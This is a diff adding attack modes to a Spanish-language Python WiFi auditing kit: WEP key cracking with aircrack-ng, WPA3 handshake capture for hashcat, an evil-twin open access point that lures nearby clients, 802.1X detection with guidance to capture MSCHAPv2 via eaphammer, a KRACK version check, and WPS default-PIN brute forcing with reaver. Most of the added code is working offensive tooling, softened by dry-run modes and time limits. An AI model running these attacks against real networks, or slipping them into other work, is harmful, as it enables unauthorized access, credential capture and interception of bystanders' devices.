@@ -9,8 +9,10 @@ import re
 import resource
 import shutil
 import sys
+import signal
 import subprocess
 import tempfile
+import time
 
 from oui_lookup import posible_wpsplinter, vendor_de_mac
 from wps_capture_utils import estado_wps, etiqueta_modelo, lista_wps, parse_wash_json
@@ -41,7 +43,9 @@ def validar_objetivo(interfaz, bssid, canal):
 
 
 def binario(nombre):
-    encontrado = shutil.which(nombre)
+    # hostapd/dnsmasq viven en /usr/sbin y el PATH bajo sudo -S puede no verlo
+    encontrado = shutil.which(nombre) or shutil.which(
+        nombre, path=os.environ.get("PATH", "") + ":/usr/sbin")
     if encontrado:
         return encontrado
     sudo = os.environ.get("SUDO_USER")
@@ -699,6 +703,327 @@ def wifi_wpsplinter(interfaz, ssid, salida=None, seco=False):
     return rc
 
 
+
+def _carpeta_capturas(prefijo, salida=None):
+    if salida or os.environ.get("AUDITOR_CAPTURAS_DIR"):
+        base = Path(salida or os.environ["AUDITOR_CAPTURAS_DIR"])
+    elif os.environ.get("SUDO_USER"):
+        base = Path(pwd.getpwnam(os.environ["SUDO_USER"]).pw_dir) / "capturas_wifi"
+    else:
+        base = Path.home() / "capturas_wifi"
+    if base.is_symlink():
+        raise ValueError("la salida no puede ser un enlace simbólico")
+    base.mkdir(parents=True, exist_ok=True)
+    return Path(tempfile.mkdtemp(prefix=prefijo, dir=base))
+
+
+def _ceder(carpeta):
+    if os.environ.get("SUDO_UID") and os.environ.get("SUDO_GID"):
+        uid, gid = int(os.environ["SUDO_UID"]), int(os.environ["SUDO_GID"])
+        for ruta in carpeta.rglob("*"):
+            os.chown(ruta, uid, gid)
+        os.chown(carpeta, uid, gid)
+
+
+def wep(interfaz, bssid, canal, segundos=90, seco=False):
+    """Captura IVs con airodump y prueba el crackeo WEP con aircrack."""
+    bssid = validar_objetivo(interfaz, bssid, canal)
+    if not 15 <= segundos <= 900:
+        raise ValueError("--segundos debe estar entre 15 y 900")
+    if seco:
+        print(f"Plan: {segundos}s de IVs contra {bssid} (canal {canal}) y crack "
+              "con aircrack-ng -a 1")
+        return 0
+    if os.geteuid() != 0:
+        raise ValueError("requiere sudo e interfaz en modo monitor")
+    airodump, aircrack = binario("airodump-ng"), binario("aircrack-ng")
+    os.umask(0o077)
+    carpeta = _carpeta_capturas("wep_")
+    cap = carpeta / "ivs"
+    try:
+        with open(os.devnull, "wb") as nada:
+            captura = subprocess.Popen(
+                [airodump, "--bssid", bssid, "-c", str(canal), "-w", str(cap),
+                 interfaz], stdout=nada, stderr=nada, preexec_fn=limitar_captura)
+            try:
+                captura.wait(timeout=segundos)
+            except subprocess.TimeoutExpired:
+                captura.terminate()
+                captura.wait(timeout=15)
+        pcap = Path(str(cap) + "-01.cap")
+        if not pcap.is_file():
+            print("Captura WEP vacía: el AP no está en ese canal o no emite")
+            return 3
+        crack = subprocess.run([aircrack, "-a", "1", "-b", bssid, str(pcap)],
+                               capture_output=True, text=True, timeout=120,
+                               check=False)
+        hallado = "KEY FOUND" in crack.stdout
+        informe = carpeta / "aircrack.txt"
+        informe.write_text(crack.stdout + crack.stderr, encoding="utf-8")
+        if hallado:
+            for linea in crack.stdout.splitlines():
+                if "KEY FOUND" in linea:
+                    partes = linea.split("[")
+                    hexkey = partes[1].split("]")[0] if len(partes) > 1 else ""
+                    print(f"Clave WEP hallada ({len(hexkey.replace(':', '')) // 2} "
+                          f"bytes): ver {informe}")
+                    break
+        else:
+            print("Sin clave WEP: faltan IVs (reintenta con más segundos o "
+                  "genera tráfico con arpreplay)")
+        return 0 if hallado else 1
+    finally:
+        _ceder(carpeta)
+
+
+def wpa3(interfaz, bssid, canal, segundos=60, seco=False):
+    """Captura marcos SAE/EAPOL (WPA3) con hcxdumptool y los convierte a 22000."""
+    bssid = validar_objetivo(interfaz, bssid, canal)
+    if not 10 <= segundos <= 600:
+        raise ValueError("--segundos debe estar entre 10 y 600")
+    if seco:
+        print(f"Plan: {segundos}s de captura SAE/EAPOL de {bssid} (canal {canal}) "
+              "con hcxdumptool y conversión a 22000")
+        return 0
+    if os.geteuid() != 0:
+        raise ValueError("requiere sudo e interfaz en modo monitor")
+    hcx, conversion = binario("hcxdumptool"), binario("hcxpcapngtool")
+    os.umask(0o077)
+    carpeta = _carpeta_capturas("wpa3_")
+    try:
+        cap = carpeta / "sae.pcapng"
+        bitacora = carpeta / "hcxdumptool.log"
+        with open(os.devnull, "wb") as nada, bitacora.open("wb") as registro:
+            subprocess.run(["timeout", "--signal=INT", "--kill-after=3s",
+                            str(segundos), hcx, "-i", interfaz, "-c",
+                            f"{canal}{'a' if canal <= 14 else 'b'}",
+                            "-w", str(cap)], stdout=registro, stderr=nada,
+                           check=False, preexec_fn=limitar_captura)
+        sae = "sae" in bitacora.read_text(errors="replace").lower()
+        hash_22000 = carpeta / "objetivo.22000"
+        with open(os.devnull, "wb") as nada:
+            subprocess.run([conversion, "-o", str(hash_22000), str(cap)],
+                           stdout=nada, stderr=nada, timeout=60, check=False)
+        lineas = (sum(1 for _ in hash_22000.open()) if hash_22000.is_file() else 0)
+        print(f"SAE observado: {'sí' if sae else 'no'}; material 22000: {lineas} "
+              f"hash(es); captura: {cap}")
+        if lineas:
+            print(f"Crackéalo con: auditor_generico.sh --tipo wifi {hash_22000}")
+        return 0 if lineas else 1
+    finally:
+        _ceder(carpeta)
+
+
+def evil_twin(interfaz, ssid, canal=1, segundos=60, seco=False):
+    """Clon abierto del SSID con hostapd+dnsmasq; cuenta qué clientes se asocian."""
+    if not ssid or len(ssid) > 32:
+        raise ValueError("--ssid debe tener 1-32 caracteres")
+    if not 10 <= segundos <= 600:
+        raise ValueError("--segundos debe estar entre 10 y 600")
+    if seco:
+        print(f"Plan: AP abierto '{ssid}' canal {canal} por {segundos}s en "
+              f"{interfaz}; se perderá el WiFi durante la prueba y se contarán "
+              "las asociaciones entrantes")
+        return 0
+    modo = _modo_interfaz(interfaz)
+    if modo != "managed":
+        raise ValueError(f"{interfaz} está en modo {modo}; evil-twin usa la "
+                         "interfaz en managed (sin monitor)")
+    if os.geteuid() != 0:
+        raise ValueError("requiere sudo")
+    hostapd = binario("hostapd")
+    dnsmasq = binario("dnsmasq")
+    hostapd_cli = binario("hostapd_cli")
+    carpeta = _carpeta_capturas("eviltwin_")
+    conf = carpeta / "hostapd.conf"
+    conf.write_text(
+        f"interface={interfaz}\ndriver=nl80211\nssid={ssid}\n"
+        f"hw_mode={'g' if canal <= 14 else 'a'}\nchannel={canal}\n"
+        "ieee80211n=1\nwmm_enabled=0\n", encoding="utf-8")
+    pids = []
+    try:
+        subprocess.run(["ip", "addr", "add", "192.168.250.1/24", "dev", interfaz],
+                       check=False, capture_output=True, timeout=10)
+        with open(os.devnull, "wb") as nada:
+            subprocess.run([hostapd, "-B", "-P", str(carpeta / "hostapd.pid"),
+                            str(conf)], stdout=nada, stderr=nada, timeout=30,
+                           check=True)
+            subprocess.run([dnsmasq, "-u", "root", "-i", interfaz,
+                            "--pid-file=" + str(carpeta / "dnsmasq.pid"),
+                            "--port=0", "--no-resolv",
+                            f"--dhcp-range=192.168.250.50,192.168.250.150,12h",
+                            "--dhcp-leasefile=" + str(carpeta / "dnsmasq.leases")],
+                           stdout=nada, stderr=nada, timeout=30, check=True)
+        time.sleep(segundos)
+        asociados = set()
+        estacion = subprocess.run(
+            [hostapd_cli, "-i", interfaz, "-p", "/var/run/hostapd", "sta_first",
+             interfaz], capture_output=True, text=True, timeout=10, check=False)
+        actual = estacion.stdout.strip()
+        while actual and actual.upper() != "FAIL" and len(asociados) < 64:
+            asociados.add(actual)
+            estacion = subprocess.run(
+                [hostapd_cli, "-i", interfaz, "-p", "/var/run/hostapd",
+                 "sta_next", f"{actual} {interfaz}"], capture_output=True,
+                text=True, timeout=10, check=False)
+            actual = estacion.stdout.strip()
+        leases = (carpeta / "dnsmasq.leases")
+        alquilados = (sum(1 for _ in leases.open()) if leases.is_file() else 0)
+        for mac in sorted(asociados):
+            print(f"asociado: {mac[:8]}xx:xx:xx:{mac[-5:]}")
+        print(f"Dispositivos que se unieron al clon: {len(asociados)} "
+              f"(DHCP concedido: {alquilados})")
+        return 0 if asociados else 1
+    finally:
+        for nombre in ("hostapd.pid", "dnsmasq.pid"):
+            archivo = carpeta / nombre
+            if archivo.is_file():
+                try:
+                    os.kill(int(archivo.read_text().strip()), signal.SIGTERM)
+                except (ProcessLookupError, ValueError):
+                    pass
+        subprocess.run(["ip", "addr", "del", "192.168.250.1/24", "dev", interfaz],
+                       check=False, capture_output=True, timeout=10)
+        _ceder(carpeta)
+
+
+def enterprise(interfaz, banda="abg", segundos=20, forzar=False, seco=False):
+    """Detección de APs 802.1X (AUTH=MGT) y guía para eaphammer."""
+    if seco:
+        print(f"Plan: {segundos}s de escaneo y filtrado de APs con AUTH=MGT "
+              f"(empresa) en banda {banda}")
+        return 0
+    if os.geteuid() != 0:
+        raise ValueError("requiere sudo e interfaz en modo monitor")
+    airodump = binario("airodump-ng")
+    os.umask(0o077)
+    carpeta = _carpeta_capturas("mgt_")
+    try:
+        cap = carpeta / "barrido"
+        with open(os.devnull, "wb") as nada:
+            proceso = subprocess.Popen(
+                [airodump, "-w", str(cap), "--output-format", "csv", "-a",
+                 banda.upper(), interfaz], stdout=nada, stderr=nada,
+                preexec_fn=limitar_captura)
+            try:
+                proceso.wait(timeout=segundos)
+            except subprocess.TimeoutExpired:
+                proceso.terminate()
+                proceso.wait(timeout=15)
+        csv = Path(str(cap) + "-01.csv")
+        mgt = []
+        if csv.is_file():
+            for linea in csv.read_text(errors="replace").splitlines():
+                campos = linea.split(",")
+                if len(campos) > 13 and campos[0].count(":") == 5 \
+                        and campos[7].strip() == "MGT":
+                    mgt.append((campos[0], campos[3].strip(), campos[13].strip()))
+        if mgt:
+            for bssid, canal, essid in mgt:
+                print(f"AP 802.1X: {bssid} canal {canal} ESSID '{essid.strip()}'")
+            print("Ataque típico: eaphammer (hostapd-wpe + Evil Twin) para "
+                  "capturar MSCHAPv2 y crackearlo con hashcat -m 5500")
+            if not shutil.which("eaphammer"):
+                print("eaphammer no está instalado: git clone https://github.com/"
+                      "securestate/eaphammer && ./eaphammer --cert-wizard "
+                      "(fuera del ámbito acotado del kit)")
+            return 0
+        print("Sin APs 802.1X (AUTH=MGT) en el barrido: el entorno es SOHO "
+              "personal, el ataque enterprise no aplica")
+        return 1
+    finally:
+        _ceder(carpeta)
+
+
+def krack(seco=False):
+    """Comprobación lado cliente: versiones de wpa_supplicant/hostapd vs KRACK y FragAttacks."""
+    if seco:
+        print("Plan: leer versiones locales de wpa_supplicant y hostapd y "
+              "compararlas con los parches de KRACK (2.7) y FragAttacks (2.10)")
+        return 0
+    objetivos = {"wpa_supplicant": ("/usr/sbin/wpa_supplicant", "-v", "2.7",
+                                    "KRACK (2017) se parcheó en 2.7"),
+                 "hostapd": ("/usr/sbin/hostapd", "-v", "2.7",
+                             "KRACK en el AP se parcheó en 2.7")}
+    saneados = 0
+    for nombre, (ruta, flag, minimo, nota) in objetivos.items():
+        if not Path(ruta).exists():
+            print(f"{nombre}: no instalado — no aplica")
+            saneados += 1
+            continue
+        try:
+            salida = subprocess.run([ruta, flag], capture_output=True, text=True,
+                                    timeout=10, check=False)
+            salida = salida.stdout + salida.stderr  # hostapd -v escribe por stderr
+        except OSError:
+            print(f"{nombre}: no se pudo ejecutar — inconcluso")
+            continue
+        version = ""
+        for token in salida.replace("v", " ").split():
+            if token[:1].isdigit() and "." in token:
+                version = token
+                break
+        try:
+            actual = tuple(int(x) for x in version.split(".")[:2])
+            umbral = tuple(int(x) for x in minimo.split("."))
+        except ValueError:
+            print(f"{nombre}: versión ilegible — inconcluso")
+            continue
+        estado = "parcheado" if actual >= umbral else "VULNERABLE"
+        print(f"{nombre} {version}: {estado} — {nota}")
+        if actual >= umbral:
+            saneados += 1
+    print("FragAttacks (2021) exige además el kernel y el stack Bluetooth al día: "
+          "mantén las actualizaciones de Debian; la prueba activa (client-attack "
+          "de KRACK, demo_*.py de FragAttacks) ataca a los CLIENTES, no al AP, y "
+          "queda fuera del ámbito acotado del kit")
+    return 0 if saneados == len(objetivos) else 1
+
+
+def wps_pins(interfaz, bssid, canal, limite=10, seco=False):
+    """Prueba los PINes WPS por defecto conocidos de fabricantes."""
+    bssid = validar_objetivo(interfaz, bssid, canal)
+    lista = Path(__file__).resolve().parent / "wordlists" / "wps_pins_fabricante.txt"
+    if not lista.is_file():
+        raise ValueError(f"falta {lista}")
+    pines = [linea.strip() for linea in lista.read_text().splitlines()
+             if linea.strip() and not linea.startswith("#")]
+    limite = max(1, min(int(limite), len(pines)))
+    if seco:
+        print(f"Plan: hasta {limite} PINes por defecto ({len(pines)} en el "
+              f"diccionario) contra {bssid}, canal {canal}")
+        return 0
+    if os.geteuid() != 0:
+        raise ValueError("requiere sudo e interfaz en modo monitor")
+    reaver = binario("reaver")
+    os.umask(0o077)
+    carpeta = _carpeta_capturas("wpspins_")
+    try:
+        for indice, pin in enumerate(pines[:limite], 1):
+            registro = open(carpeta / f"pin_{pin}.log", "w", encoding="utf-8")
+            with registro:
+                try:
+                    proceso = subprocess.run(
+                        [reaver, "-i", interfaz, "-b", bssid, "-c", str(canal),
+                         "-p", pin, "-e", "-d", "5", "-vv", "-L"],
+                        stdout=registro, stderr=subprocess.STDOUT, timeout=90,
+                        check=False, cwd=carpeta, preexec_fn=limitar_log)
+                except subprocess.TimeoutExpired:
+                    proceso = None
+            texto = (carpeta / f"pin_{pin}.log").read_text(errors="replace")
+            if proceso is not None and ("PIN Verified" in texto
+                                        or "WPS PIN: " in texto
+                                        and "successful" in texto):
+                print(f"PIN aceptado: {pin[:2]}**{pin[-2:]} (ver "
+                      f"{carpeta / f'pin_{pin}.log'})")
+                return 0
+            print(f"pin {indice}/{limite}: {pin[:2]}**{pin[-2:]} rechazado")
+        print("Ningún PIN por defecto del diccionario fue aceptado")
+        return 1
+    finally:
+        _ceder(carpeta)
+
+
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     sub = parser.add_subparsers(dest="accion", required=True)
@@ -738,6 +1063,38 @@ def main():
     wpsplinter_parser.add_argument("--ssid", required=True)
     wpsplinter_parser.add_argument("--salida")
     wpsplinter_parser.add_argument("--dry-run", action="store_true")
+    wep_parser = sub.add_parser("wifi-wep")
+    wep_parser.add_argument("--interfaz", required=True)
+    wep_parser.add_argument("--bssid", required=True)
+    wep_parser.add_argument("--canal", type=int, required=True)
+    wep_parser.add_argument("--segundos", type=int, default=90)
+    wep_parser.add_argument("--dry-run", action="store_true")
+    wpa3_parser = sub.add_parser("wifi-wpa3")
+    wpa3_parser.add_argument("--interfaz", required=True)
+    wpa3_parser.add_argument("--bssid", required=True)
+    wpa3_parser.add_argument("--canal", type=int, required=True)
+    wpa3_parser.add_argument("--segundos", type=int, default=60)
+    wpa3_parser.add_argument("--dry-run", action="store_true")
+    twin_parser = sub.add_parser("wifi-evil-twin")
+    twin_parser.add_argument("--interfaz", required=True)
+    twin_parser.add_argument("--ssid", required=True)
+    twin_parser.add_argument("--canal", type=int, default=1)
+    twin_parser.add_argument("--segundos", type=int, default=60)
+    twin_parser.add_argument("--dry-run", action="store_true")
+    mgt_parser = sub.add_parser("wifi-enterprise")
+    mgt_parser.add_argument("--interfaz", required=True)
+    mgt_parser.add_argument("--banda", choices=("bg", "a", "abg"), default="abg")
+    mgt_parser.add_argument("--segundos", type=int, default=20)
+    mgt_parser.add_argument("--forzar", action="store_true")
+    mgt_parser.add_argument("--dry-run", action="store_true")
+    krack_parser = sub.add_parser("wifi-krack")
+    krack_parser.add_argument("--dry-run", action="store_true")
+    pins_parser = sub.add_parser("wps-pins")
+    pins_parser.add_argument("--interfaz", required=True)
+    pins_parser.add_argument("--bssid", required=True)
+    pins_parser.add_argument("--canal", type=int, required=True)
+    pins_parser.add_argument("--limite-intentos", type=int, default=10)
+    pins_parser.add_argument("--dry-run", action="store_true")
     monitor_parser = sub.add_parser("wifi-monitor")
     monitor_parser.add_argument("--interfaz")
     monitor_parser.add_argument("--accion", dest="accion_monitor",
@@ -760,6 +1117,23 @@ def main():
                                  args.forzar, args.dry_run)
         if args.accion == "wifi-wpsplinter":
             return wifi_wpsplinter(args.interfaz, args.ssid, args.salida, args.dry_run)
+        if args.accion == "wifi-wep":
+            return wep(args.interfaz, args.bssid, args.canal, args.segundos,
+                       args.dry_run)
+        if args.accion == "wifi-wpa3":
+            return wpa3(args.interfaz, args.bssid, args.canal, args.segundos,
+                        args.dry_run)
+        if args.accion == "wifi-evil-twin":
+            return evil_twin(args.interfaz, args.ssid, args.canal, args.segundos,
+                             args.dry_run)
+        if args.accion == "wifi-enterprise":
+            return enterprise(args.interfaz, args.banda, args.segundos,
+                              args.forzar, args.dry_run)
+        if args.accion == "wifi-krack":
+            return krack(args.dry_run)
+        if args.accion == "wps-pins":
+            return wps_pins(args.interfaz, args.bssid, args.canal,
+                            args.limite_intentos, args.dry_run)
         if args.accion == "wifi-monitor":
             if args.listar:
                 return listar_interfaces_wifi()
